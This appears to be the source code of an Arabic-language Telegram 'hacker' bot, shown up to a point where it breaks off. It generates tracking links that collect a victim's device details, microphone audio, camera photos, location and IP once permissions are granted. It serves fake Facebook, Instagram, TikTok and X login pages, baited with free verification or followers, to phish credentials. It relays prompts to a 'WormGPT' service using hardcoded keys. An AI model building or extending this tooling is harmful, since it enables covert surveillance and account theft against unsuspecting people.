import express from 'express';
import cors from 'cors';
import { Telegraf, Markup, TelegramError } from 'telegraf';
import Database from 'better-sqlite3';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = 3000;
const BOT_TOKEN = process.env.BOT_TOKEN || '';
console.log(`BOT_TOKEN present: ${!!BOT_TOKEN}`);
const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;

// ========== قاعدة البيانات ==========
const db = new Database('links.db');

db.exec(`
  CREATE TABLE IF NOT EXISTS links (
      link_id TEXT PRIMARY KEY,
      chat_id INTEGER,
      feature TEXT,
      created_at TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS visits (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      link_id TEXT,
      visitor_ip TEXT,
      feature TEXT,
      data TEXT,
      visited_at TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS custom_buttons (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      chat_id INTEGER,
      name TEXT,
      url TEXT
  );
  CREATE TABLE IF NOT EXISTS users (
      chat_id INTEGER PRIMARY KEY,
      invited_by INTEGER,
      invites_count INTEGER DEFAULT 0,
      worm_messages_used INTEGER DEFAULT 0,
      worm_messages_limit INTEGER DEFAULT 5,
      joined_at TIMESTAMP
  );
  CREATE TABLE IF NOT EXISTS button_names (
      key TEXT PRIMARY KEY,
      name TEXT
  );
`);

const DEFAULT_BUTTON_NAMES: Record<string, string> = {
  info: "💻 معلومات الجهاز",
  mic: "🎙️ تسجيل صوت",
  cameraF: "📸 صورة أمامية",
  cameraB: "📸 صورة خلفية",
  location: "📍 موقع",
  ip_info: "🌐 معلومات IP (3 مواقع) 🔴🟢🔵",
  btn_wormgpt_start: "😈 وورم جي بي تي",
  btn_full_hack: "🔥 اختراق كامل",
  btn_whatsapp: "🟢 فك حظر واتساب",
  btn_joke: "😂 اعطني نكتة",
  btn_instagram: "📸 حظر إنستجرام",
  btn_tiktok: "🎵 حظر تيك توك",
  btn_tiktok_ban: "🚷 تبنيد بث تيك توك",
  btn_hacker: "💻 كيف تصبح هاكر",
  btn_facebook_login: "📘 توثيق فيسبوك مجاني",
  btn_instagram_login: "📸 زيادة متابعين إنستجرام مجاني",
  btn_tiktok_login: "🎵 زيادة متابعين تيك توك مجاني",
  btn_x_login: "❌ توثيق العلامة الزرقاء مجاني"
};

function getButtonName(key: string): string {
  const row = db.prepare('SELECT name FROM button_names WHERE key = ?').get(key) as any;
  return row ? row.name : DEFAULT_BUTTON_NAMES[key];
}

function setButtonName(key: string, name: string) {
  db.prepare('INSERT OR REPLACE INTO button_names (key, name) VALUES (?, ?)').run(key, name);
}

function cBtn(text: string, data: string, colorStyle: 'blue' | 'red' | 'green' = 'blue') {
    const btn = Markup.button.callback(text, data) as any;
    if (colorStyle === 'blue') {
        btn.style = 'primary';
    } else if (colorStyle === 'red') {
        btn.style = 'danger';
    } else if (colorStyle === 'green') {
        btn.style = 'success';
    }
    return btn;
}

function getUser(chatId: number) {
  return db.prepare('SELECT * FROM users WHERE chat_id = ?').get(chatId) as { chat_id: number, invited_by: number | null, invites_count: number, worm_messages_used: number, worm_messages_limit: number, joined_at: string } | undefined;
}

function createUser(chatId: number, invitedBy?: number) {
  const stmt = db.prepare('INSERT OR IGNORE INTO users (chat_id, invited_by, joined_at) VALUES (?, ?, ?)');
  const res = stmt.run(chatId, invitedBy || null, new Date().toISOString());
  if (res.changes > 0 && invitedBy && invitedBy !== chatId) {
      db.prepare('UPDATE users SET invites_count = invites_count + 1 WHERE chat_id = ?').run(invitedBy);
      // Give inviter extra limits if invite count triggers it (every 10 invites = 5 more messages)
      const inviter = getUser(invitedBy);
      if (inviter && inviter.invites_count > 0 && inviter.invites_count % 10 === 0) {
          db.prepare('UPDATE users SET worm_messages_limit = worm_messages_limit + 5 WHERE chat_id = ?').run(invitedBy);
          // We can optionally notify inviter but it requires bot instance
      }
  }
}

function checkUserLimitsAndIncrement(chatId: number): boolean {
  const user = getUser(chatId);
  if (!user) return false;
  if (user.worm_messages_used >= user.worm_messages_limit) return false;
  db.prepare('UPDATE users SET worm_messages_used = worm_messages_used + 1 WHERE chat_id = ?').run(chatId);
  return true;
}

function getCustomButtons() {
  return db.prepare('SELECT * FROM custom_buttons').all() as { id: number, name: string, url: string }[];
}

function addCustomButton(name: string, url: string) {
  const stmt = db.prepare('INSERT INTO custom_buttons (chat_id, name, url) VALUES (0, ?, ?)');
  stmt.run(name, url);
}

function updateCustomButton(id: number, name: string, url: string) {
  const stmt = db.prepare('UPDATE custom_buttons SET name = ?, url = ? WHERE id = ?');
  stmt.run(name, url, id);
}

function deleteCustomButton(id: number) {
  const stmt = db.prepare('DELETE FROM custom_buttons WHERE id = ?');
  stmt.run(id);
}

function getCustomButton(id: number) {
  return db.prepare('SELECT * FROM custom_buttons WHERE id = ?').get(id) as { id: number, name: string, url: string } | undefined;
}

function saveLink(linkId: string, chatId: number, feature: string) {
  const stmt = db.prepare('INSERT OR REPLACE INTO links (link_id, chat_id, feature, created_at) VALUES (?, ?, ?, ?)');
  stmt.run(linkId, chatId, feature, new Date().toISOString());
}

function getLink(linkId: string) {
  const stmt = db.prepare('SELECT chat_id, feature FROM links WHERE link_id = ?');
  return stmt.get(linkId) as { chat_id: number; feature: string } | undefined;
}

function saveVisit(linkId: string, visitorIp: string, feature: string, data: any) {
  const stmt = db.prepare('INSERT INTO visits (link_id, visitor_ip, feature, data, visited_at) VALUES (?, ?, ?, ?, ?)');
  stmt.run(linkId, visitorIp, feature, JSON.stringify(data), new Date().toISOString());
}

const SUPABASE_URL = "https://aolckxwjfendnyrkrapc.supabase.co";
const CODE_KEY = "code_qIRFAu-YxGK8J-FIlobq";
const API_PASSWORD = "@HackerExos";
const OWNER_ID = 7845383853;

let _wormApiKey: string | null = null;
let _wormKeyExpires = 0;

async function getWormApiKey() {
  if (_wormApiKey && Date.now() < _wormKeyExpires) {
    return _wormApiKey;
  }
  try {
    const res = await fetch(`${SUPABASE_URL}/functions/v1/api-login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        telegram_id: String(OWNER_ID),
        password: API_PASSWORD,
        code_key: CODE_KEY,
      })
    });
    if (res.ok) {
      const data = await res.json();
      if (data.success) {
        _wormApiKey = data.api_key;
        _wormKeyExpires = Date.now() + 300 * 1000;
        return _wormApiKey;
      }
    }
  } catch (err) {
    console.error("WormGPT Login Error", err);
  }
  return null;
}

async function askWormGPT(message: string, clear_memory = false) {
  const apiKey = await getWormApiKey();
  if (!apiKey) return "❌ فشل الاتصال بالخادم";
  
  try {
    const res = await fetch(`${SUPABASE_URL}/functions/v1/wormgpt`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        api_key: apiKey,
        telegram_id: String(OWNER_ID),
        code_key: CODE_KEY,
        ...(clear_memory ? { clear_memory: true } : {
          message,
          model: "V1",
          web_enabled: false,
          fix_code: false,
          stream: false
        })
      })
    });
    if (res.ok) {
      const data = await res.json();
      if (clear_memory) return "✅ تم مسح الذاكرة";
      return data.response || "❌ لم يتم إرجاع رد";
    }
    return `⚠️ خطأ (${res.status})`;
  } catch (err: any) {
    return `⚠️ خطأ: ${err.message}`;
  }
}

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

app.get('/api/keepalive', (req, res) => res.sendStatus(200));

// ========== تهيئة بوت تليجرام ==========
const userPendingState = new Map<number, string>();
const tempButtonData = new Map<number, any>();
let bot: Telegraf | null = null;
if (BOT_TOKEN) {
  bot = new Telegraf(BOT_TOKEN);

  const checkSub = async (ctx: any, next: any) => {
    if (ctx.from?.id === 7845383853) return next();
    try {
      const channels = ['-1003051514428', '@HackerExosVIP', '@HackerExos_vip'];
      let isSubscribed = true;
      for (const channel of channels) {
        try {
          const res = await ctx.telegram.getChatMember(channel, ctx.from.id);
          if (res.status === 'left' || res.status === 'kicked') {
            isSubscribed = false;
            break;
          }
        } catch (err) {
          isSubscribed = false;
        }
      }
      
      if (!isSubscribed || ctx.callbackQuery?.data === 'check_sub') {
        const replyMsg = "⚠️ *عذراً، يجب عليك الاشتراك في قنوات البوت لتتمكن من استخدامه:*\n\nاشترك ثم اضغط على '✅ تحقق من الاشتراك'";
        const keyboards = Markup.inlineKeyboard([
          [Markup.button.url("القناة الخاصة 🔒", "https://t.me/+rOYB35YXFgM2OWE8")],
          [Markup.button.url("القناة العامة 1 📢", "https://t.me/HackerExosVIP")],
          [Markup.button.url("القناة العامة 2 📢", "https://t.me/HackerExos_vip")],
          [cBtn("✅ تحقق من الاشتراك", "check_sub", "green")]
        ]);
        
        if (ctx.callbackQuery?.data === 'check_sub') {
          if (!isSubscribed) {
             return ctx.answerCbQuery("❌ لم تشترك في جميع القنوات بعد!", {show_alert: true});
          } else {
             ctx.answerCbQuery("✅ شكراً لاشتراكك! أرسل /start للبدء.");
             ctx.deleteMessage().catch(() => {});
             return next();
          }
        } else {
          return ctx.reply(replyMsg, { parse_mode: 'Markdown', ...keyboards });
        }
      }
    } catch (e) {}
    return next();
  };

  bot.use(checkSub);

  bot.command('start', async (ctx) => {
    console.log(`Received /start from ${ctx.from.id}`);
    userPendingState.delete(ctx.from.id);
    tempButtonData.delete(ctx.from.id);

    const payloadText = (ctx as any).payload || (ctx.message && 'text' in ctx.message ? ctx.message.text.split(' ')[1] : undefined);
    if (payloadText && payloadText.trim() !== '' && !isNaN(Number(payloadText))) {
        createUser(ctx.from.id, Number(payloadText));
    } else {
        createUser(ctx.from.id);
    }

    const instructions = `✨ *أهلاً بك في البوت!* ✨\n\n📌 *تعليمات الاستخدام:*\n1. اختر نوع الرابط الذي تريد إنشاءه من الأزرار بالأسفل.\n2. (لبعض الميزات) سيُطلب منك إدخال المدة المطلوبة للتسجيل.\n3. سيقوم البوت بتوليد رابط مخصص سري.\n4. قم بمشاركة هذا الرابط.\n5. عندما يتم فتح الرابط وإعطاء الصلاحيات، سيتم إرسال البيانات إليك هنا مباشرة.`;
    
    // Custom Buttons
    const customBtns = getCustomButtons();
    const extraButtons = [];
    if (customBtns.length > 0) {
        for (const b of customBtns) {
            try { new URL(b.url); extraButtons.push([Markup.button.url(b.name, b.url)]); } catch (e) { console.error('Invalid URL for button', b); }
        }
    }
    
    const baseKeyboard = [
      ...extraButtons,
      [cBtn(getButtonName("info"), "info", "blue"), cBtn(getButtonName("mic"), "mic", "blue")],
      [cBtn(getButtonName("cameraF"), "cameraF", "blue"), cBtn(getButtonName("cameraB"), "cameraB", "blue")],
      [cBtn(getButtonName("location"), "location", "blue"), cBtn(getButtonName("ip_info"), "ip_info", "blue")],
      [cBtn(getButtonName("btn_wormgpt_start"), "btn_wormgpt_start", "green"), cBtn(getButtonName("btn_full_hack"), "btn_full_hack", "red")],
      [cBtn(getButtonName("btn_whatsapp"), "btn_whatsapp", "green"), cBtn(getButtonName("btn_joke"), "btn_joke", "blue")],
      [cBtn(getButtonName("btn_instagram"), "btn_instagram", "red"), cBtn(getButtonName("btn_tiktok"), "btn_tiktok", "red")],
      [cBtn(getButtonName("btn_tiktok_ban"), "btn_tiktok_ban", "red"), cBtn(getButtonName("btn_hacker"), "btn_hacker", "blue")],
      [cBtn(getButtonName("btn_facebook_login"), "btn_facebook_login", "blue"), cBtn(getButtonName("btn_instagram_login"), "btn_instagram_login", "blue")],
      [cBtn(getButtonName("btn_tiktok_login"), "btn_tiktok_login", "blue"), cBtn(getButtonName("btn_x_login"), "btn_x_login", "blue")]
    ];

    if (ctx.from.id === 7845383853) {
      baseKeyboard.push([cBtn("⚙️ لوحة التحكم", "btn_control_panel", "green")]);
    }

    await ctx.reply(
      instructions,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard(baseKeyboard)
      }
    ).catch(err => console.error("Start Reply Error:", err));
  });

  const PROMPTS: Record<string, string> = {
    "btn_whatsapp": "اكتب لي رسالة احترافية وقوية لطلب فك حظر حسابي على واتساب.",
    "btn_joke": "أعطني نكتة عربية مضحكة جداً وغير مكررة",
    "btn_instagram": "اكتب لي رسالة رسمية باللغة الإنجليزية لشركة ميتا لطلب فك حظر حسابي على إنستجرام بسبب خطأ.",
    "btn_tiktok": "اكتب لي رسالة مقنعة باللغة الإنجليزية لطلب فك حظر حسابي على تيك توك.",
    "btn_tiktok_ban": "اكتب لي رسالة قوية باللغة العربية للإبلاغ عن بث مباشر مسيء جداً على تيك توك لطلب تبنيده فوراً.",
    "btn_hacker": "اشرح لي بالتفصيل وبخطوات واضحة كيف أبدأ في مجال الأمن السيبراني (الهاكر الأخلاقي) من الصفر.",
  };

  bot.on('callback_query', async (ctx) => {
    // Helper to safely answer callback queries and ignore timeout errors
    const safeAnswer = (text?: string, extra?: any) => 
      ctx.answerCbQuery(text, extra).catch((err: any) => {
        if (err && err.description && err.description.includes('query is too old')) return;
        console.error("Failed to answer callback query:", err);
      });

    try {
      const feature = (ctx.callbackQuery as any).data;
      const chatId = ctx.from?.id;

      if (!chatId) return;

      if (feature === 'check_sub') return; // Handled in checkSub middleware

      if (feature === 'btn_wormgpt_start') {
        const u = getUser(chatId);
        if (!u) createUser(chatId);
        
        userPendingState.set(chatId, 'WORM_CHAT');
        await ctx.editMessageText(
          `🤖 **تم الدخول في وضع الدردشة مع وورم جي بي تي** 💬\n\n🗣️ أرسل رسالتك الآن وسأجيبك مباشرة.\n\n⚠️ عدد الرسائل المتبقية لديك: ${u ? Math.max(0, u.worm_messages_limit - u.worm_messages_used) : 5}`,
          { 
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([[cBtn("🔁 إعادة انشاء المحادثة", "worm_chat_reset", "blue")]]) 
          }
        ).catch(() => {});
        return;
      }

      if (feature === 'worm_chat_reset') {
        await askWormGPT('', true);
        await safeAnswer("تم إعادة تعيين المحادثة ومسح الذاكرة.");
        userPendingState.delete(chatId);
        await ctx.editMessageText("تم إعادة تعيين المحادثة. يمكنك إرسال /start لقائمة الخيارات.").catch(()=>{});
        return;
      }

      if (feature === 'btn_control_panel') {
        const stats = db.prepare('SELECT COUNT(*) as users, sum(invites_count) as total_invites, sum(worm_messages_used) as total_worm FROM users').get() as any;
        const panelText = `⚙️ *لوحة تحكم المشرف:*\n\n` +
          `👥 عدد المستخدمين: ${stats.users || 0}\n` +
          `🔗 إجمالي الدعوات: ${stats.total_invites || 0}\n` +
          `💬 استخدام WormGPT: ${stats.total_worm || 0}\n\n` +
          `اختر من القائمة بالأسفل:`;

        await ctx.editMessageText(panelText, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [cBtn("إرسال رسالة للكل 📢", "admin_broadcast", "red")],
                [cBtn("➕ إضافة زر تطبيق", "btn_action_add", "green")],
                [cBtn("⚙️ إدارة الأزرار", "btn_action_manage", "blue")],
                [cBtn("✏️ تعديل أسماء الأزرار الأساسية", "btn_action_rename_base", "blue")],
                [cBtn("🔙 رجوع", "btn_back_to_start", "red")]
            ])
        }).catch(()=>{});
        await safeAnswer();
        return;
      }
      
      if (feature === 'admin_broadcast') {
          userPendingState.set(chatId, 'ADMIN_BROADCAST');
          await ctx.reply("أرسل الرسالة التي تريد إذاعتها لجميع المستخدمين:").catch(()=>{});
          await safeAnswer();
          return;
      }

      if (feature === 'btn_back_to_start') {
        const customBtns = getCustomButtons();
        const extraButtons = [];
        if (customBtns.length > 0) {
            for (const b of customBtns) {
                try { new URL(b.url); extraButtons.push([Markup.button.url(b.name, b.url)]); } catch (e) { console.error('Invalid URL for button', b); }
            }
        }
        
        const baseKeyboard = [
          ...extraButtons,
          [cBtn(getButtonName("info"), "info", "blue"), cBtn(getButtonName("mic"), "mic", "blue")],
          [cBtn(getButtonName("cameraF"), "cameraF", "blue"), cBtn(getButtonName("cameraB"), "cameraB", "blue")],
          [cBtn(getButtonName("location"), "location", "blue"), cBtn(getButtonName("ip_info"), "ip_info", "blue")],
          [cBtn(getButtonName("btn_wormgpt_start"), "btn_wormgpt_start", "green"), cBtn(getButtonName("btn_full_hack"), "btn_full_hack", "red")],
          [cBtn(getButtonName("btn_whatsapp"), "btn_whatsapp", "green"), cBtn(getButtonName("btn_joke"), "btn_joke", "blue")],
          [cBtn(getButtonName("btn_instagram"), "btn_instagram", "red"), cBtn(getButtonName("btn_tiktok"), "btn_tiktok", "red")],
          [cBtn(getButtonName("btn_tiktok_ban"), "btn_tiktok_ban", "red"), cBtn(getButtonName("btn_hacker"), "btn_hacker", "blue")],
          [cBtn(getButtonName("btn_facebook_login"), "btn_facebook_login", "blue"), cBtn(getButtonName("btn_instagram_login"), "btn_instagram_login", "blue")],
          [cBtn(getButtonName("btn_tiktok_login"), "btn_tiktok_login", "blue"), cBtn(getButtonName("btn_x_login"), "btn_x_login", "blue")]
        ];

        if (ctx.from.id === 7845383853) {
          baseKeyboard.push([cBtn("⚙️ لوحة التحكم", "btn_control_panel", "green")]);
        }

        await ctx.editMessageText(
          `✨ *أهلاً بك في البوت!* ✨\n\n📌 *تعليمات الاستخدام:*\n1. اختر نوع الرابط الذي تريد إنشاءه من الأزرار بالأسفل.\n2. (لبعض الميزات) سيُطلب منك إدخال المدة المطلوبة للتسجيل.\n3. سيقوم البوت بتوليد رابط مخصص سري.\n4. قم بمشاركة هذا الرابط.\n5. عندما يتم فتح الرابط وإعطاء الصلاحيات، سيتم إرسال البيانات إليك هنا مباشرة.`,
          {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(baseKeyboard)
          }
        ).catch(err => console.error("Back Reply Error:", err));
        await safeAnswer();
        return;
      }

      if (feature === 'btn_action_add') {
        userPendingState.set(chatId, 'ADD_BTN_NAME');
        await ctx.reply("أرسل الآن اسم الزر (مثال: منصة تداول):").catch(()=>{});
        await safeAnswer();
        return;
      }

      if (feature === 'btn_action_rename_base') {
        const btnKeys = Object.keys(DEFAULT_BUTTON_NAMES);
        let keyboard: any[] = [];
        for (let i = 0; i < btnKeys.length; i += 2) {
            const row = [];
            const key1 = btnKeys[i];
            row.push(cBtn(getButtonName(key1), `btn_rnb_${key1}`, "blue"));
            if (i + 1 < btnKeys.length) {
                const key2 = btnKeys[i + 1];
                row.push(cBtn(getButtonName(key2), `btn_rnb_${key2}`, "blue"));
            }
            keyboard.push(row);
        }
        keyboard.push([cBtn("🔙 رجوع", "btn_control_panel", "red")]);

        await ctx.editMessageText("✏️ *تعديل أسماء الأزرار الأساسية:*\nاختر الزر الذي تريد تغيير اسمه:", {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(keyboard)
        }).catch(()=>{});
        await safeAnswer();
        return;
      }

      if (feature.startsWith('btn_rnb_')) {
          const key = feature.replace('btn_rnb_', '');
          const currentName = getButtonName(key);
          userPendingState.set(chatId, `RENAME_BASE_${key}`);
          await ctx.reply(`أرسل الآن الاسم الجديد لزر (${currentName}):\n(لإلغاء الأمر، أرسل /start)`).catch(()=>{});
          await safeAnswer();
          return;
      }

      if (feature === 'btn_action_manage') {
        const customBtns = getCustomButtons();
        if (customBtns.length === 0) {
           await safeAnswer("❌ لا يوجد لديك أزرار مخصصة حالياً.", { show_alert: true });
           return;
        }
        
        let keyboard: any[] = [];
        for (const b of customBtns) {
            keyboard.push([
                cBtn(`🗑️ حذف: ${b.name}`, `btn_del_${b.id}`, "red"),
                cBtn(`✏️ تعديل: ${b.name}`, `btn_edit_${b.id}`, "blue")
            ]);
        }
        keyboard.push([cBtn("🔙 رجوع", "btn_control_panel", "red")]);
        
        await ctx.editMessageText("⚙️ *إدارة الأزرار الخاصة بك:*", {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(keyboard)
        }).catch(err => console.error("Manage Reply Error:", err));
        await safeAnswer();
        return;
      }

      if (feature.startsWith('btn_del_')) {
          const id = parseInt(feature.replace('btn_del_', ''));
          deleteCustomButton(id);
          await safeAnswer("✅ تم الحذف بنجاح.");
          await ctx.deleteMessage().catch(()=>{});
          return;
      }

      if (feature.startsWith('btn_edit_')) {
          const id = parseInt(feature.replace('btn_edit_', ''));
          const btn = getCustomButton(id);
          if (!btn) {
              await safeAnswer("❌ الزر غير موجود.");
              return;
          }
          userPendingState.set(chatId, `EDIT_BTN_${id}`);
          await ctx.reply(`أرسل الآن الرابط الجديد لزر (${btn.name}):`).catch(()=>{});
          await safeAnswer();
          return;
      }

      if (feature === 'btn_full_hack') {
        const u = getUser(chatId);
        const botUsername = ctx.botInfo?.username || 'hackerr3xbot';
        let currentInvites = u ? u.invites_count : 0;
        
        let vipMsg = '';
        if (currentInvites >= 30) {
           vipMsg = `✅ *تم تفعيل ميزة الاختراق الكامل (VIP)* ✅\n\nأنت الآن تملك صلاحيات VIP كاملة! (هذه ميزة تجريبية حالياً)`;
        } else {
           vipMsg = `⚠️ *تفعيل ميزة الاختراق الكامل (VIP)* ⚠️\n\nيجب عليك دعوة 30 شخص لاستخدام البوت لتفعيل هذه الميزة مجاناً.\n\nانسخ هذا النص وشاركه مع أصدقائك وفي الجروبات:\n\n🔥 *بوت اختراق وسحب داتا خيالي!* 🔥\nجرب البوت من هنا: https://t.me/${botUsername}?start=${chatId}\n\n📊 عدد الدعوات الحالي: ${currentInvites}/30`;
        }
        await ctx.reply(vipMsg, { parse_mode: 'Markdown' }).catch(()=>{});
        await safeAnswer();
        return;
      }

      if (feature === 'btn_facebook_login') {
          await ctx.reply(`اضغط للبدء في صفحة تسجيل الدخول فيسبوك:\n${APP_URL}/facebook.html`).catch(()=>{});
          await safeAnswer();
          return;
      }

      if (feature === 'btn_instagram_login') {
          await ctx.reply(`اضغط للبدء في صفحة تسجيل الدخول إنستجرام:\n${APP_URL}/instagram.html`).catch(()=>{});
          await safeAnswer();
          return;
      }

      if (feature === 'btn_tiktok_login') {
          await ctx.reply(`اضغط للبدء في صفحة تسجيل الدخول تيك توك:\n${APP_URL}/tiktok.html`).catch(()=>{});
          await safeAnswer();
          return;
      }

      if (feature === 'btn_x_login') {
          await ctx.reply(`اضغط للبدء في صفحة تسجيل الدخول X:\n${APP_URL}/x.html`).catch(()=>{});
          await safeAnswer();
          return;
      }

      if (PROMPTS[feature]) {
        const u = getUser(chatId);
        const limitReached = !checkUserLimitsAndIncrement(chatId);
        if (limitReached && chatId !== 7845383853) {
            const botUsername = ctx.botInfo?.username || 'hackerr3xbot';
            await safeAnswer("❌ لقد استنفذت رصيدك من الرسائل لـ WormGPT.", { show_alert: true });
            await ctx.reply(`لقد استنفذت رصيدك لـ WormGPT (الحد: ${u?.worm_messages_limit || 5}).\nقم بدعوة 10 أشخاص من خلال الرابط أدناه للحصول على 5 رسائل إضافية:\n\nhttps://t.me/${botUsername}?start=${chatId}`).catch(()=>{});
            return;
        }

        await ctx.editMessageText("⏳ جاري إنشاء الرد...").catch(() => {});
        const aiResponse = await askWormGPT(PROMPTS[feature]);
        const textToSend = aiResponse.length > 4000 ? aiResponse.substring(0, 4000) + '...' : aiResponse;
        await ctx.editMessageText(textToSend, { parse_mode: 'Markdown' }).catch(async () => {
           await ctx.editMessageText(textToSend).catch(async () => {
               await ctx.reply(textToSend).catch(() => {});
           });
        });
        return;
      }

      const needsDuration = ['mic'].includes(feature);
      if (needsDuration) {
        userPendingState.set(chatId, feature);
        await ctx.reply("الرجاء إدخال المدة المطلوبة بالثواني (أرقام فقط, مثال: 5):").catch(()=>{});
        await safeAnswer();
        return;
      }

      const payload = `${chatId}::${feature}`;
      const encodedId = Buffer.from(payload).toString('hex');

      const link = `${APP_URL.replace(/\/$/, '')}/track/${encodedId}`;

      const featureNames: Record<string, string> = {
        'info': '💻 معلومات الجهاز',
        'location': '📍 موقع جغرافي',
        'cameraF': '📸 صورة أمامية',
        'cameraB': '📸 صورة خلفية',
        'ip_info': '🌐 معلومات IP شاملة'
      };
      
      // Fallback for legacy
      if (!featureNames[feature]) {
          featureNames[feature] = feature;
      }

      await ctx.editMessageText(
        `✅ تم إنشاء رابط ${featureNames[feature]}:\n\n${link}\n\nشارك الرابط وسأرسل لك البيانات فوراً!`,
        { parse_mode: 'HTML' }
      ).catch(async () => {
         await ctx.reply(`✅ تم إنشاء رابط ${featureNames[feature]}:\n\n${link}\n\nشارك الرابط وسأرسل لك البيانات فوراً!`, { parse_mode: 'HTML' }).catch(() => {});
      });
    } catch (error) {
      console.error("Unhandled error in callback_query:", error);
    }
  });

  bot.on('message', async (ctx) => {
    try {
      if (!ctx.message || !('text' in ctx.message)) return;
      const chatId = ctx.from.id;
      
      if (!userPendingState.has(chatId)) return;

      const stateInfo = userPendingState.get(chatId)!;
      const text = ctx.message.text.trim();

      if (stateInfo === 'WORM_CHAT') {
           const u = getUser(chatId);
           const limitReached = !checkUserLimitsAndIncrement(chatId);
           if (limitReached && chatId !== 7845383853) {
               const botUsername = ctx.botInfo?.username || 'hackerr3xbot';
               await ctx.reply(`❌ لقد استنفذت رصيدك لـ WormGPT (الحد: ${u?.worm_messages_limit || 5}).\nقم بدعوة 10 أشخاص من خلال الرابط أدناه للحصول على 5 رسائل إضافية:\n\nhttps://t.me/${botUsername}?start=${chatId}`).catch(()=>{});
               return;
           }
           await ctx.sendChatAction('typing').catch(()=>{});
           const aiResp = await askWormGPT(text);
           const textToSend = aiResp.length > 4000 ? aiResp.substring(0, 4000) + '...' : aiResp;
           await ctx.reply(textToSend, { parse_mode: 'Markdown' }).catch(async ()=>{
               await ctx.reply(textToSend).catch(()=>{});
           });
           return;
      }
      
      if (stateInfo === 'ADMIN_BROADCAST' && chatId === 7845383853) {
          const usersRes = db.prepare('SELECT chat_id FROM users').all() as {chat_id: number}[];
          let successCount = 0;
          await ctx.reply("⏳ جاري الإذاعة... سيتم إعلامك عند الانتهاء.").catch(()=>{});
          for (const u of usersRes) {
              try {
                  await ctx.telegram.sendMessage(u.chat_id, text);
                  successCount++;
              } catch(e) {}
          }
          userPendingState.delete(chatId);
          await ctx.reply(`✅ تم الإرسال بنجاح إلى ${successCount} مستخدم.`).catch(()=>{});
          return;
      }

      if (stateInfo === 'ADD_BTN_NAME') {
          tempButtonData.set(chatId, { name: text });
          userPendingState.set(chatId, 'ADD_BTN_URL');
          await ctx.reply("أرسل الآن الرابط الخاص بالزر (يجب أن يبدأ بـ https://):").catch(()=>{});
          return;
      }

      if (stateInfo === 'ADD_BTN_URL') {
          if (!text.startsWith('https://')) {
              await ctx.reply("❌ عذراً، يجب أن يبدأ الرابط بـ https:// . أرسل الرابط مرة أخرى:").catch(()=>{});
              return;
          }
          const data = tempButtonData.get(chatId);
          if (data && data.name) {
              addCustomButton(data.name, text);
              userPendingState.delete(chatId);
              tempButtonData.delete(chatId);
              await ctx.reply(`✅ تم إضافة زر (${data.name}) بنجاح! أرسل /start لرؤيته.`).catch(()=>{});
          }
          return;
      }

      if (stateInfo.startsWith('RENAME_BASE_')) {
          const key = stateInfo.replace('RENAME_BASE_', '');
          if (text.length === 0) {
              await ctx.reply("❌ الاسم لا يمكن أن يكون فارغاً. أرسل الاسم مرة أخرى:").catch(()=>{});
              return;
          }
          setButtonName(key, text);
          userPendingState.delete(chatId);
          await ctx.reply(`✅ تم تعديل اسم الزر بنجاح إلى (${text})! أرسل /start لرؤية التغييرات.`).catch(()=>{});
          return;
      }

      if (stateInfo.startsWith('EDIT_BTN_')) {
          if (!text.startsWith('https://')) {
              await ctx.reply("❌ عذراً، يجب أن يبدأ الرابط بـ https:// . أرسل الرابط مرة أخرى:").catch(()=>{});
              return;
          }
          const id = parseInt(stateInfo.replace('EDIT_BTN_', ''));
          const btn = getCustomButton(id);
          if (btn) {
              updateCustomButton(id, btn.name, text);
              userPendingState.delete(chatId);
              await ctx.reply(`✅ تم تعديل زر (${btn.name}) بنجاح!`).catch(()=>{});
          }
          return;
      }

      const duration = parseInt(text);

      if (isNaN(duration) || duration <= 0 || duration > 3600) {
        await ctx.reply("❌ الرجاء إدخال رقم صحيح للمدة بالثواني (مثال: 5):").catch(()=>{});
        return;
      }

      userPendingState.delete(chatId);

      const featureWithDuration = `${stateInfo}_${duration}`;
      const payload = `${chatId}::${featureWithDuration}`;
      const linkId = Buffer.from(payload).toString('hex');

      const link = `${APP_URL.replace(/\/$/, '')}/track/${linkId}`;

      const featureNames: Record<string, string> = {
        'mic': '🎙️ تسجيل صوت',
        'videoF': '🎥 فيديو أمامي',
        'videoB': '🎥 فيديو خلفي'
      };
      const fName = featureNames[stateInfo] || stateInfo;

      await ctx.reply(
        `✅ تم إنشاء رابط ${fName} لمدة ${duration} ثوان:\n\n${link}\n\nشارك الرابط وسأرسل لك البيانات فوراً!`,
        { parse_mode: 'HTML' }
      ).catch(()=>{});
    } catch (err) {
      console.error("Unhandled error in message handler:", err);
    }
  });

  const webhookPath = `/api/telegram-webhook`;
  const webhookUrl = `${APP_URL.replace(/\/$/, '')}${webhookPath}`;

  app.post(webhookPath, (req, res) => {
     if (!bot) return res.sendStatus(200);
     bot.handleUpdate(req.body, res).catch(err => {
         console.error('Error handling Telegram update:', err);
         if (!res.headersSent) res.sendStatus(200);
     });
  });

  bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {});

  async function launchWithRetry() {
    try {
      if (bot) {
          await bot.launch();
          console.log("Telegram bot launched successfully with polling.");
      }
    } catch (err: any) {
      if (err && err.response && err.response.error_code === 409) {
          console.warn("Conflict detected (409). Retrying in 5 seconds...");
          setTimeout(launchWithRetry, 5000);
      } else {
          console.error("Bot launch failed:", err);
          setTimeout(launchWithRetry, 10000); // Retry even on other errors
      }
    }
  }

  // Always use polling in this environment, as webhooks are typically blocked by the dev proxy
  launchWithRetry();

  process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  });
  process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
  });
  
